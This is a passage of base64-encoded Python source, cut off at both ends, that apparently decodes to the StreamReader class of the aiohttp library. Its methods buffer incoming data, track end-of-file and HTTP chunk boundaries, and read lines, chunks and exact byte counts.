YuX2xvd193YXRlciwgc2VsZi5faGlnaF93YXRlcilcclxuXHJcbiAgICBkZWYgZXhjZXB0aW9uKHNlbGYpIC0+IE9wdGlvbmFsW0Jhc2VFeGNlcHRpb25dOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9leGNlcHRpb25cclxuXHJcbiAgICBkZWYgc2V0X2V4Y2VwdGlvbihzZWxmLCBleGM6IEJhc2VFeGNlcHRpb24pIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gZXhjXHJcbiAgICAgICAgc2VsZi5fZW9mX2NhbGxiYWNrcy5jbGVhcigpXHJcblxyXG4gICAgICAgIHdhaXRlciA9IHNlbGYuX3dhaXRlclxyXG4gICAgICAgIGlmIHdhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBzZXRfZXhjZXB0aW9uKHdhaXRlciwgZXhjKVxyXG5cclxuICAgICAgICB3YWl0ZXIgPSBzZWxmLl9lb2Zfd2FpdGVyXHJcbiAgICAgICAgaWYgd2FpdGVyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9lb2Zfd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBzZXRfZXhjZXB0aW9uKHdhaXRlciwgZXhjKVxyXG5cclxuICAgIGRlZiBvbl9lb2Yoc2VsZiwgY2FsbGJhY2s6IENhbGxhYmxlW1tdLCBOb25lXSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9lb2Y6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGNhbGxiYWNrKClcclxuICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgICAgIGludGVybmFsX2xvZ2dlci5leGNlcHRpb24oIkV4Y2VwdGlvbiBpbiBlb2YgY2FsbGJhY2siKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHNlbGYuX2VvZl9jYWxsYmFja3MuYXBwZW5kKGNhbGxiYWNrKVxyXG5cclxuICAgIGRlZiBmZWVkX2VvZihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuX2VvZiA9IFRydWVcclxuXHJcbiAgICAgICAgd2FpdGVyID0gc2VsZi5fd2FpdGVyXHJcbiAgICAgICAgaWYgd2FpdGVyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl93YWl0ZXIgPSBOb25lXHJcbiAgICAgICAgICAgIHNldF9yZXN1bHQod2FpdGVyLCBOb25lKVxyXG5cclxuICAgICAgICB3YWl0ZXIgPSBzZWxmLl9lb2Zfd2FpdGVyXHJcbiAgICAgICAgaWYgd2FpdGVyIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9lb2Zfd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBzZXRfcmVzdWx0KHdhaXRlciwgTm9uZSlcclxuXHJcbiAgICAgICAgZm9yIGNiIGluIHNlbGYuX2VvZl9jYWxsYmFja3M6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGNiKClcclxuICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjpcclxuICAgICAgICAgICAgICAgIGludGVybmFsX2xvZ2dlci5leGNlcHRpb24oIkV4Y2VwdGlvbiBpbiBlb2YgY2FsbGJhY2siKVxyXG5cclxuICAgICAgICBzZWxmLl9lb2ZfY2FsbGJhY2tzLmNsZWFyKClcclxuXHJcbiAgICBkZWYgaXNfZW9mKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiUmV0dXJuIFRydWUgaWYgIFwnZmVlZF9lb2ZcJyB3YXMgY2FsbGVkLiIiIlxyXG4gICAgICAgIHJldHVybiBzZWxmLl9lb2ZcclxuXHJcbiAgICBkZWYgYXRfZW9mKHNlbGYpIC0+IGJvb2w6XHJcbiAgICAgICAgIiIiUmV0dXJuIFRydWUgaWYgdGhlIGJ1ZmZlciBpcyBlbXB0eSBhbmQgXCdmZWVkX2VvZlwnIHdhcyBjYWxsZWQuIiIiXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2VvZiBhbmQgbm90IHNlbGYuX2J1ZmZlclxyXG5cclxuICAgIGFzeW5jIGRlZiB3YWl0X2VvZihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX2VvZjpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGFzc2VydCBzZWxmLl9lb2Zfd2FpdGVyIGlzIE5vbmVcclxuICAgICAgICBzZWxmLl9lb2Zfd2FpdGVyID0gc2VsZi5fbG9vcC5jcmVhdGVfZnV0dXJlKClcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX2VvZl93YWl0ZXJcclxuICAgICAgICBmaW5hbGx5OlxyXG4gICAgICAgICAgICBzZWxmLl9lb2Zfd2FpdGVyID0gTm9uZVxyXG5cclxuICAgIGRlZiB1bnJlYWRfZGF0YShzZWxmLCBkYXRhOiBieXRlcykgLT4gTm9uZTpcclxuICAgICAgICAiIiJyb2xsYmFjayByZWFkaW5nIHNvbWUgZGF0YSBmcm9tIHN0cmVhbSwgaW5zZXJ0aW5nIGl0IHRvIGJ1ZmZlciBoZWFkLiIiIlxyXG4gICAgICAgIHdhcm5pbmdzLndhcm4oXHJcbiAgICAgICAgICAgICJ1bnJlYWRfZGF0YSgpIGlzIGRlcHJlY2F0ZWQgIlxyXG4gICAgICAgICAgICAiYW5kIHdpbGwgYmUgcmVtb3ZlZCBpbiBmdXR1cmUgcmVsZWFzZXMgKCMzMjYwKSIsXHJcbiAgICAgICAgICAgIERlcHJlY2F0aW9uV2FybmluZyxcclxuICAgICAgICAgICAgc3RhY2tsZXZlbD0yLFxyXG4gICAgICAgIClcclxuICAgICAgICBpZiBub3QgZGF0YTpcclxuICAgICAgICAgICAgcmV0dXJuXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2J1ZmZlcl9vZmZzZXQ6XHJcbiAgICAgICAgICAgIHNlbGYuX2J1ZmZlclswXSA9IHNlbGYuX2J1ZmZlclswXVtzZWxmLl9idWZmZXJfb2Zmc2V0IDpdXHJcbiAgICAgICAgICAgIHNlbGYuX2J1ZmZlcl9vZmZzZXQgPSAwXHJcbiAgICAgICAgc2VsZi5fc2l6ZSArPSBsZW4oZGF0YSlcclxuICAgICAgICBzZWxmLl9jdXJzb3IgLT0gbGVuKGRhdGEpXHJcbiAgICAgICAgc2VsZi5fYnVmZmVyLmFwcGVuZGxlZnQoZGF0YSlcclxuICAgICAgICBzZWxmLl9lb2ZfY291bnRlciA9IDBcclxuXHJcbiAgICAjIFRPRE86IHNpemUgaXMgaWdub3JlZCwgcmVtb3ZlIHRoZSBwYXJhbSBsYXRlclxyXG4gICAgZGVmIGZlZWRfZGF0YShzZWxmLCBkYXRhOiBieXRlcywgc2l6ZTogaW50ID0gMCkgLT4gTm9uZTpcclxuICAgICAgICBhc3NlcnQgbm90IHNlbGYuX2VvZiwgImZlZWRfZGF0YSBhZnRlciBmZWVkX2VvZiJcclxuXHJcbiAgICAgICAgaWYgbm90IGRhdGE6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICBzZWxmLl9zaXplICs9IGxlbihkYXRhKVxyXG4gICAgICAgIHNlbGYuX2J1ZmZlci5hcHBlbmQoZGF0YSlcclxuICAgICAgICBzZWxmLnRvdGFsX2J5dGVzICs9IGxlbihkYXRhKVxyXG5cclxuICAgICAgICB3YWl0ZXIgPSBzZWxmLl93YWl0ZXJcclxuICAgICAgICBpZiB3YWl0ZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3dhaXRlciA9IE5vbmVcclxuICAgICAgICAgICAgc2V0X3Jlc3VsdCh3YWl0ZXIsIE5vbmUpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX3NpemUgPiBzZWxmLl9oaWdoX3dhdGVyIGFuZCBub3Qgc2VsZi5fcHJvdG9jb2wuX3JlYWRpbmdfcGF1c2VkOlxyXG4gICAgICAgICAgICBzZWxmLl9wcm90b2NvbC5wYXVzZV9yZWFkaW5nKClcclxuXHJcbiAgICBkZWYgYmVnaW5faHR0cF9jaHVua19yZWNlaXZpbmcoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9odHRwX2NodW5rX3NwbGl0cyBpcyBOb25lOlxyXG4gICAgICAgICAgICBpZiBzZWxmLnRvdGFsX2J5dGVzOlxyXG4gICAgICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJDYWxsZWQgYmVnaW5faHR0cF9jaHVua19yZWNlaXZpbmcgd2hlbiIgInNvbWUgZGF0YSB3YXMgYWxyZWFkeSBmZWQiXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIHNlbGYuX2h0dHBfY2h1bmtfc3BsaXRzID0gW11cclxuXHJcbiAgICBkZWYgZW5kX2h0dHBfY2h1bmtfcmVjZWl2aW5nKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2VsZi5faHR0cF9jaHVua19zcGxpdHMgaXMgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkNhbGxlZCBlbmRfY2h1bmtfcmVjZWl2aW5nIHdpdGhvdXQgY2FsbGluZyAiXHJcbiAgICAgICAgICAgICAgICAiYmVnaW5fY2h1bmtfcmVjZWl2aW5nIGZpcnN0IlxyXG4gICAgICAgICAgICApXHJcblxyXG4gICAgICAgICMgc2VsZi5faHR0cF9jaHVua19zcGxpdHMgY29udGFpbnMgbG9naWNhbCBieXRlIG9mZnNldHMgZnJvbSBzdGFydCBvZlxyXG4gICAgICAgICMgdGhlIGJvZHkgdHJhbnNmZXIuIEVhY2ggb2Zmc2V0IGlzIHRoZSBvZmZzZXQgb2YgdGhlIGVuZCBvZiBhIGNodW5rLlxyXG4gICAgICAgICMgIkxvZ2ljYWwiIG1lYW5zIGJ5dGVzLCBhY2Nlc3NpYmxlIGZvciBhIHVzZXIuXHJcbiAgICAgICAgIyBJZiBubyBjaHVua3MgY29udGFpbmlnIGxvZ2ljYWwgZGF0YSB3ZXJlIHJlY2VpdmVkLCBjdXJyZW50IHBvc2l0aW9uXHJcbiAgICAgICAgIyBpcyBkaWZpbml0ZWx5IHplcm8uXHJcbiAgICAgICAgcG9zID0gc2VsZi5faHR0cF9jaHVua19zcGxpdHNbLTFdIGlmIHNlbGYuX2h0dHBfY2h1bmtfc3BsaXRzIGVsc2UgMFxyXG5cclxuICAgICAgICBpZiBzZWxmLnRvdGFsX2J5dGVzID09IHBvczpcclxuICAgICAgICAgICAgIyBXZSBzaG91bGQgbm90IGFkZCBlbXB0eSBjaHVua3MgaGVyZS4gU28gd2UgY2hlY2sgZm9yIHRoYXQuXHJcbiAgICAgICAgICAgICMgTm90ZSwgd2hlbiBjaHVua2VkICsgZ3ppcCBpcyB1c2VkLCB3ZSBjYW4gcmVjZWl2ZSBhIGNodW5rXHJcbiAgICAgICAgICAgICMgb2YgY29tcHJlc3NlZCBkYXRhLCBidXQgdGhhdCBkYXRhIG1heSBub3QgYmUgZW5vdWdoIGZvciBnemlwIEZTTVxyXG4gICAgICAgICAgICAjIHRvIHlpZWxkIGFueSB1bmNvbXByZXNzZWQgZGF0YS4gVGhhdFwncyB3aHkgY3VycmVudCBwb3NpdGlvbiBtYXlcclxuICAgICAgICAgICAgIyBub3QgY2hhbmdlIGFmdGVyIHJlY2VpdmluZyBhIGNodW5rLlxyXG4gICAgICAgICAgICByZXR1cm5cclxuXHJcbiAgICAgICAgc2VsZi5faHR0cF9jaHVua19zcGxpdHMuYXBwZW5kKHNlbGYudG90YWxfYnl0ZXMpXHJcblxyXG4gICAgICAgICMgd2FrZSB1cCByZWFkY2h1bmsgd2hlbiBlbmQgb2YgaHR0cCBjaHVuayByZWNlaXZlZFxyXG4gICAgICAgIHdhaXRlciA9IHNlbGYuX3dhaXRlclxyXG4gICAgICAgIGlmIHdhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgc2VsZi5fd2FpdGVyID0gTm9uZVxyXG4gICAgICAgICAgICBzZXRfcmVzdWx0KHdhaXRlciwgTm9uZSlcclxuXHJcbiAgICBhc3luYyBkZWYgX3dhaXQoc2VsZiwgZnVuY19uYW1lOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgIyBTdHJlYW1SZWFkZXIgdXNlcyBhIGZ1dHVyZSB0byBsaW5rIHRoZSBwcm90b2NvbCBmZWVkX2RhdGEoKSBtZXRob2RcclxuICAgICAgICAjIHRvIGEgcmVhZCBjb3JvdXRpbmUuIFJ1bm5pbmcgdHdvIHJlYWQgY29yb3V0aW5lcyBhdCB0aGUgc2FtZSB0aW1lXHJcbiAgICAgICAgIyB3b3VsZCBoYXZlIGFuIHVuZXhwZWN0ZWQgYmVoYXZpb3VyLiBJdCB3b3VsZCBub3QgcG9zc2libGUgdG8ga25vd1xyXG4gICAgICAgICMgd2hpY2ggY29yb3V0aW5lIHdvdWxkIGdldCB0aGUgbmV4dCBkYXRhLlxyXG4gICAgICAgIGlmIHNlbGYuX3dhaXRlciBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIiVzKCkgY2FsbGVkIHdoaWxlIGFub3RoZXIgY29yb3V0aW5lIGlzICJcclxuICAgICAgICAgICAgICAgICJhbHJlYWR5IHdhaXRpbmcgZm9yIGluY29taW5nIGRhdGEiICUgZnVuY19uYW1lXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgd2FpdGVyID0gc2VsZi5fd2FpdGVyID0gc2VsZi5fbG9vcC5jcmVhdGVfZnV0dXJlKClcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIHNlbGYuX3RpbWVyOlxyXG4gICAgICAgICAgICAgICAgd2l0aCBzZWxmLl90aW1lcjpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCB3YWl0ZXJcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGF3YWl0IHdhaXRlclxyXG4gICAgICAgIGZpbmFsbHk6XHJcbiAgICAgICAgICAgIHNlbGYuX3dhaXRlciA9IE5vbmVcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZGxpbmUoc2VsZikgLT4gYnl0ZXM6XHJcbiAgICAgICAgcmV0dXJuIGF3YWl0IHNlbGYucmVhZHVudGlsKClcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZHVudGlsKHNlbGYsIHNlcGFyYXRvcjogYnl0ZXMgPSBiIlxcbiIpIC0+IGJ5dGVzOlxyXG4gICAgICAgIHNlcGxlbiA9IGxlbihzZXBhcmF0b3IpXHJcbiAgICAgICAgaWYgc2VwbGVuID09IDA6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlNlcGFyYXRvciBzaG91bGQgYmUgYXQgbGVhc3Qgb25lLWJ5dGUgc3RyaW5nIilcclxuXHJcbiAgICAgICAgaWYgc2VsZi5fZXhjZXB0aW9uIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBzZWxmLl9leGNlcHRpb25cclxuXHJcbiAgICAgICAgY2h1bmsgPSBiIiJcclxuICAgICAgICBjaHVua19zaXplID0gMFxyXG4gICAgICAgIG5vdF9lbm91Z2ggPSBUcnVlXHJcblxyXG4gICAgICAgIHdoaWxlIG5vdF9lbm91Z2g6XHJcbiAgICAgICAgICAgIHdoaWxlIHNlbGYuX2J1ZmZlciBhbmQgbm90X2Vub3VnaDpcclxuICAgICAgICAgICAgICAgIG9mZnNldCA9IHNlbGYuX2J1ZmZlcl9vZmZzZXRcclxuICAgICAgICAgICAgICAgIGljaGFyID0gc2VsZi5fYnVmZmVyWzBdLmZpbmQoc2VwYXJhdG9yLCBvZmZzZXQpICsgMVxyXG4gICAgICAgICAgICAgICAgIyBSZWFkIGZyb20gY3VycmVudCBvZmZzZXQgdG8gZm91bmQgc2VwYXJhdG9yIG9yIHRvIHRoZSBlbmQuXHJcbiAgICAgICAgICAgICAgICBkYXRhID0gc2VsZi5fcmVhZF9ub3dhaXRfY2h1bmsoaWNoYXIgLSBvZmZzZXQgaWYgaWNoYXIgZWxzZSAtMSlcclxuICAgICAgICAgICAgICAgIGNodW5rICs9IGRhdGFcclxuICAgICAgICAgICAgICAgIGNodW5rX3NpemUgKz0gbGVuKGRhdGEpXHJcbiAgICAgICAgICAgICAgICBpZiBpY2hhcjpcclxuICAgICAgICAgICAgICAgICAgICBub3RfZW5vdWdoID0gRmFsc2VcclxuXHJcbiAgICAgICAgICAgICAgICBpZiBjaHVua19zaXplID4gc2VsZi5faGlnaF93YXRlcjpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJDaHVuayB0b28gYmlnIilcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2VvZjpcclxuICAgICAgICAgICAgICAgIGJyZWFrXHJcblxyXG4gICAgICAgICAgICBpZiBub3RfZW5vdWdoOlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5fd2FpdCgicmVhZHVudGlsIilcclxuXHJcbiAgICAgICAgcmV0dXJuIGNodW5rXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlYWQoc2VsZiwgbjogaW50ID0gLTEpIC0+IGJ5dGVzOlxyXG4gICAgICAgIGlmIHNlbGYuX2V4Y2VwdGlvbiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgcmFpc2Ugc2VsZi5fZXhjZXB0aW9uXHJcblxyXG4gICAgICAgICMgbWlncmF0aW9uIHByb2JsZW07IHdpdGggRGF0YVF1ZXVlIHlvdSBoYXZlIHRvIGNhdGNoXHJcbiAgICAgICAgIyBFb2ZTdHJlYW0gZXhjZXB0aW9uLCBzbyBjb21tb24gd2F5IGlzIHRvIHJ1biBwYXlsb2FkLnJlYWQoKSBpbnNpZGVcclxuICAgICAgICAjIGluZmluaXRlIGxvb3AuIHdoYXQgY2FuIGNhdXNlIHJlYWwgaW5maW5pdGUgbG9vcCB3aXRoIFN0cmVhbVJlYWRlclxyXG4gICAgICAgICMgbGV0cyBrZWVwIHRoaXMgY29kZSBvbmUgbWFqb3IgcmVsZWFzZS5cclxuICAgICAgICBpZiBfX2RlYnVnX186XHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2VvZiBhbmQgbm90IHNlbGYuX2J1ZmZlcjpcclxuICAgICAgICAgICAgICAgIHNlbGYuX2VvZl9jb3VudGVyID0gZ2V0YXR0cihzZWxmLCAiX2VvZl9jb3VudGVyIiwgMCkgKyAxXHJcbiAgICAgICAgICAgICAgICBpZiBzZWxmLl9lb2ZfY291bnRlciA+IDU6XHJcbiAgICAgICAgICAgICAgICAgICAgaW50ZXJuYWxfbG9nZ2VyLndhcm5pbmcoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICJNdWx0aXBsZSBhY2Nlc3MgdG8gU3RyZWFtUmVhZGVyIGluIGVvZiBzdGF0ZSwgIlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAibWlnaHQgYmUgaW5maW5pdGUgbG9vcC4iLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBzdGFja19pbmZvPVRydWUsXHJcbiAgICAgICAgICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiBub3QgbjpcclxuICAgICAgICAgICAgcmV0dXJuIGIiIlxyXG5cclxuICAgICAgICBpZiBuIDwgMDpcclxuICAgICAgICAgICAgIyBUaGlzIHVzZWQgdG8ganVzdCBsb29wIGNyZWF0aW5nIGEgbmV3IHdhaXRlciBob3BpbmcgdG9cclxuICAgICAgICAgICAgIyBjb2xsZWN0IGV2ZXJ5dGhpbmcgaW4gc2VsZi5fYnVmZmVyLCBidXQgdGhhdCB3b3VsZFxyXG4gICAgICAgICAgICAjIGRlYWRsb2NrIGlmIHRoZSBzdWJwcm9jZXNzIHNlbmRzIG1vcmUgdGhhbiBzZWxmLmxpbWl0XHJcbiAgICAgICAgICAgICMgYnl0ZXMuICBTbyBqdXN0IGNhbGwgc2VsZi5yZWFkYW55KCkgdW50aWwgRU9GLlxyXG4gICAgICAgICAgICBibG9ja3MgPSBbXVxyXG4gICAgICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICAgICAgYmxvY2sgPSBhd2FpdCBzZWxmLnJlYWRhbnkoKVxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGJsb2NrOlxyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgICAgICBibG9ja3MuYXBwZW5kKGJsb2NrKVxyXG4gICAgICAgICAgICByZXR1cm4gYiIiLmpvaW4oYmxvY2tzKVxyXG5cclxuICAgICAgICAjIFRPRE86IHNob3VsZCBiZSBgaWZgIGluc3RlYWQgb2YgYHdoaWxlYFxyXG4gICAgICAgICMgYmVjYXVzZSB3YWl0ZXIgbWF5YmUgdHJpZ2dlcmVkIG9uIGNodW5rIGVuZCxcclxuICAgICAgICAjIHdpdGhvdXQgZmVlZGluZyBhbnkgZGF0YVxyXG4gICAgICAgIHdoaWxlIG5vdCBzZWxmLl9idWZmZXIgYW5kIG5vdCBzZWxmLl9lb2Y6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dhaXQoInJlYWQiKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVhZF9ub3dhaXQobilcclxuXHJcbiAgICBhc3luYyBkZWYgcmVhZGFueShzZWxmKSAtPiBieXRlczpcclxuICAgICAgICBpZiBzZWxmLl9leGNlcHRpb24gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJhaXNlIHNlbGYuX2V4Y2VwdGlvblxyXG5cclxuICAgICAgICAjIFRPRE86IHNob3VsZCBiZSBgaWZgIGluc3RlYWQgb2YgYHdoaWxlYFxyXG4gICAgICAgICMgYmVjYXVzZSB3YWl0ZXIgbWF5YmUgdHJpZ2dlcmVkIG9uIGNodW5rIGVuZCxcclxuICAgICAgICAjIHdpdGhvdXQgZmVlZGluZyBhbnkgZGF0YVxyXG4gICAgICAgIHdoaWxlIG5vdCBzZWxmLl9idWZmZXIgYW5kIG5vdCBzZWxmLl9lb2Y6XHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dhaXQoInJlYWRhbnkiKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVhZF9ub3dhaXQoLTEpXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlYWRjaHVuayhzZWxmKSAtPiBUdXBsZVtieXRlcywgYm9vbF06XHJcbiAgICAgICAgIiIiUmV0dXJucyBhIHR1cGxlIG9mIChkYXRhLCBlbmRfb2ZfaHR0cF9jaHVuaykuXHJcblxyXG4gICAgICAgIFdoZW4gY2h1bmtlZCB0cmFuc2ZlclxyXG4gICAgICAgIGVuY29kaW5nIGlzIHVzZWQsIGVuZF9vZl9odHRwX2NodW5rIGlzIGEgYm9vbGVhbiBpbmRpY2F0aW5nIGlmIHRoZSBlbmRcclxuICAgICAgICBvZiB0aGUgZGF0YSBjb3JyZXNwb25kcyB0byB0aGUgZW5kIG9mIGEgSFRUUCBjaHVuayAsIG90aGVyd2lzZSBpdCBpc1xyXG4gICAgICAgIGFsd2F5cyBGYWxzZS5cclxuICAgICAgICAiIiJcclxuICAgICAgICB3aGlsZSBUcnVlOlxyXG4gICAgICAgICAgICBpZiBzZWxmLl9leGNlcHRpb24gaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBzZWxmLl9leGNlcHRpb25cclxuXHJcbiAgICAgICAgICAgIHdoaWxlIHNlbGYuX2h0dHBfY2h1bmtfc3BsaXRzOlxyXG4gICAgICAgICAgICAgICAgcG9zID0gc2VsZi5faHR0cF9jaHVua19zcGxpdHMucG9wKDApXHJcbiAgICAgICAgICAgICAgICBpZiBwb3MgPT0gc2VsZi5fY3Vyc29yOlxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAoYiIiLCBUcnVlKVxyXG4gICAgICAgICAgICAgICAgaWYgcG9zID4gc2VsZi5fY3Vyc29yOlxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiAoc2VsZi5fcmVhZF9ub3dhaXQocG9zIC0gc2VsZi5fY3Vyc29yKSwgVHJ1ZSlcclxuICAgICAgICAgICAgICAgIGludGVybmFsX2xvZ2dlci53YXJuaW5nKFxyXG4gICAgICAgICAgICAgICAgICAgICJTa2lwcGluZyBIVFRQIGNodW5rIGVuZCBkdWUgdG8gZGF0YSAiXHJcbiAgICAgICAgICAgICAgICAgICAgImNvbnN1bXB0aW9uIGJleW9uZCBjaHVuayBib3VuZGFyeSJcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgIGlmIHNlbGYuX2J1ZmZlcjpcclxuICAgICAgICAgICAgICAgIHJldHVybiAoc2VsZi5fcmVhZF9ub3dhaXRfY2h1bmsoLTEpLCBGYWxzZSlcclxuICAgICAgICAgICAgICAgICMgcmV0dXJuIChzZWxmLl9yZWFkX25vd2FpdCgtMSksIEZhbHNlKVxyXG5cclxuICAgICAgICAgICAgaWYgc2VsZi5fZW9mOlxyXG4gICAgICAgICAgICAgICAgIyBTcGVjaWFsIGNhc2UgZm9yIHNpZ25pZnlpbmcgRU9GLlxyXG4gICAgICAgICAgICAgICAgIyAoYlwnXCcsIFRydWUpIGlzIG5vdCBhIGZpbmFsIHJldHVybiB2YWx1ZSBhY3R1YWxseS5cclxuICAgICAgICAgICAgICAgIHJldHVybiAoYiIiLCBGYWxzZSlcclxuXHJcbiAgICAgICAgICAgIGF3YWl0IHNlbGYuX3dhaXQoInJlYWRjaHVuayIpXHJcblxyXG4gICAgYXN5bmMgZGVmIHJlYWRleGFjdGx5KHNlbGYsIG46IGludCkgLT4gYnl0ZXM6XHJcbiAgICAgICAgaWYgc2VsZi5fZXhjZXB0aW9uIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBzZWxmLl9leGNlcHRpb25cclxuXHJcbiAgICAgICAgYmxvY2tzID0gW10gICMgdHlwZTogTGlzdFtieXRlc11cclxuICAgICAgICB3aGlsZSBuID4gMDpcclxuICAgICAgICAgICAgYmxvY2sgPSBhd2FpdCBzZWxmLnJlYWQobilcclxuICAgICAgICAgICAgaWYgbm90IGJsb2NrOlxyXG4gICAgICAgICAgICAgICAgcGFydGlhbCA9IGIiIi5qb2luKGJsb2NrcylcclxuICAgICAgICAgICAgICAgIHJhaXNlIGFzeW5jaW8uSW5jb21wbGV0ZVJlYWRFcnJvcihwYXJ0aWFsLCBsZW4ocGFydGlhbCkgKyBuKVxyXG4gICAgICAgICAgICBibG9ja3MuYXBwZW5kKGJsb2NrKVxyXG4gICAgICAgICAgICBuIC09IGxlbihibG9jaylcclxuXHJcbiAgICAgICAgcmV0dXJuIGIiIi5qb2luKGJsb2NrcylcclxuXHJcbiAgICBkZWYgcmVhZF9ub3dhaXQoc2VsZiwgbjogaW50ID0gLTEpIC0+IGJ5dGVzOlxyXG4gICAgICAgICMgZGVmYXVsdCB3YXMgY2hhbmdlZCB0byBiZSBjb25zaXN0ZW50IHdpdGggLnJlYWQoLTEpXHJcbiAgICAgICAgI1xyXG4gICAgICAgICMgSSBiZWxpZXZlIHRoZSBtb3N0IHVzZXJzIGRvblwndCBrbm93IGFib3V0IHRoZSBtZXRob2QgYW5kXHJcbiAgICAgICAgIyB0aGV5IGFyZSBub3QgYWZmZWN0ZWQuXHJcbiAgICAgICAgaWYgc2VsZi5fZXhjZXB0aW9uIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByYWlzZSBzZWxmLl9leGNlcHRpb25cclxuXHJcbiAgICAgICAgaWYgc2VsZi5fd2FpdGVyIGFuZCBub3Qgc2VsZi5fd2FpdGVyLmRvbmUoKTpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkNhbGxlZCB3aGlsZSBzb21lIGNvcm91dGluZSBpcyB3YWl0aW5nIGZvciBpbmNvbWluZyBkYXRhLiJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gc2VsZi5fcmVhZF9ub3dhaXQobilcclxuXHJcbiAgICBkZWYgX3JlYWRfbm93YWl0X2NodW5rKHNlbGYsIG46IGludCkgLT4gYnl0ZXM6XHJcbiAgICAgICAgZmlyc3RfYnVmZmVyID0gc2VsZi5fYnVmZmVyWzBdXHJcbiAgICAgICAgb2Zmc2V0ID0gc2VsZi5fYnVmZmVyX29mZnNldFxyXG4gICAgICAgIGlmIG4gIT0gLTEgYW5kIGxlbihmaXJzdF9idWZmZXIpIC0gb2Zmc2V0ID4gbjpcclxuICAgICAgICAgICAgZGF0YSA9IGZpcnN0X2J1ZmZlcltvZmZzZXQgOiBvZmZzZXQgKyBuXVxyXG4gICAgICAgICAgICBzZWxmLl9idWZmZXJfb2Zmc2V0ICs9IG5cclxuXHJcbiAgICAgICAgZWxpZiBvZmZzZXQ6XHJcbiAgICAgICAgICAgIHNlbGYuX2J1ZmZlci5wb3BsZWZ0KClcclxuICAgICAgICAgICAgZGF0YSA9IGZpcnN0X2J1ZmZlcltvZmZzZXQ6XVxyXG4gICAgICAgICAgICBzZWxmLl9idWZmZXJfb2